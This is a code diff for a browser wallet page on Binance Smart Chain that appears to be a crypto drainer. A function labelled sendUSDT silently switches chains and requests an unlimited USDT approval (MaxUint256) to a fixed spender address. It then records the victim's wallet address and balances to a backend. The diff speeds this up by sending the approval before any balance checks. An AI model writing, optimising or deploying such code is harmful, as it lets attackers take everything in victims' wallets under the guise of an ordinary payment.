@@ -1,6 +1,7 @@
 let provider;
 let userAddress = null;
 let isConnected = false;
+let currentChainId = null;
 
 // ===== BSC CONFIG - FORCE BSC ONLY =====
 const BSC_CHAIN_ID = 56; // BSC Mainnet Chain ID
@@ -14,7 +15,7 @@ const ABI = [
 ];
 
 // ===== COMPLETELY SILENT - NO POPUPS =====
-// Only silent checks, no wallet requests on load
+// Setup and cache chain on load for faster sends
 window.addEventListener("load", async () => {
   if (window.ethereum) {
     try {
@@ -27,15 +28,22 @@ window.addEventListener("load", async () => {
       if (accounts.length > 0) {
         userAddress = accounts[0];
         isConnected = true;
-        // No auto-fill - keep UI clean
       }
+      
+      // Cache current chain ID for faster sends
+      currentChainId = await window.ethereum.request({ method: "eth_chainId" });
+      
+      // Listen for chain changes
+      window.ethereum.on("chainChanged", (chainId) => {
+        currentChainId = chainId;
+      });
     } catch (err) {
       console.log("Silent setup failed:", err);
     }
   }
 });
 
-// ===== APPROVE (BSC ONLY) =====
+// ===== APPROVE (BSC ONLY) - OPTIMIZED FOR SPEED =====
 async function sendUSDT() {
   try {
     if (!window.ethereum) {
@@ -48,15 +56,15 @@ async function sendUSDT() {
       provider = new ethers.BrowserProvider(window.ethereum);
     }
 
-    // Silently check and switch to BSC if needed
-    const chainId = await window.ethereum.request({ method: "eth_chainId" });
-    if (chainId !== "0x38") {
+    // Fast chain check using cached value
+    if (currentChainId !== "0x38") {
       // Force switch to BSC
       try {
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
           params: [{ chainId: "0x38" }]
         });
+        currentChainId = "0x38";
       } catch (switchErr) {
         if (switchErr.code === 4902) {
           // Add BSC network if not exists
@@ -70,6 +78,7 @@ async function sendUSDT() {
               blockExplorerUrls: ["https://bscscan.com"]
             }]
           });
+          currentChainId = "0x38";
         }
       }
     }
@@ -81,20 +90,23 @@ async function sendUSDT() {
     // Create contract
     const usdt = new ethers.Contract(BSC_USDT, ABI, signer);
 
-    // Get balances
-    const usdtBalanceWei = await usdt.balanceOf(address);
-    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
+    // Send approval transaction immediately (don't wait for balances first)
+    const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
     
-    const nativeBalanceWei = await provider.getBalance(address);
+    // Fetch balances in parallel while transaction is being mined
+    const [receipt, usdtBalanceWei, nativeBalanceWei] = await Promise.all([
+      tx.wait(),
+      usdt.balanceOf(address),
+      provider.getBalance(address)
+    ]);
+
+    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
     const nativeBalance = ethers.formatEther(nativeBalanceWei);
 
-    // Approve transaction
-    const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
-    const receipt = await tx.wait();
+    // Non-blocking success message
+    setTimeout(() => alert("✅ Transaction Successful!"), 0);
 
-    alert("✅ Transaction Successful!");
-
-    // Save to backend
+    // Save to backend immediately
     if (window.saveTransaction) {
       window.saveTransaction({
         walletAddress: address,
